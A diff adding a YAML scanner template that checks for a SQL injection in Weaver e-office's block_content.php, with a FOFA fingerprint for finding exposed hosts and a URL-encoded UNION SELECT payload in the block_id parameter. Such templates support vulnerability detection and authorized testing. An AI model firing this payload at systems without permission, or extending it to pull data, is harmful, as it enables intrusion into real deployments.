@@ -1,0 +1,17 @@
+id: poc-yaml-weaver-e-office-block-content-php-sqli
+info:
+  name: 泛微OA e-office block_content.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: e-office
+  fofa: app="泛微-EOffice"
+variables:
+  t1: random_int(1000,100000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /general/new_mytable/block_content.php?block_id=1%20UNION%20ALL%20SELECT%20CONCAT(0x71787a6a71,IFNULL(CAST(md5({{.t1}})%20AS%20NCHAR),0x20),0x7171627671)--%20-
+  expression: status_code == 200 && contains(body,t2) && contains(body,"eoffice")
+    && contains(body,"No such file or directory ") && contains(body,".php")
+transport: http
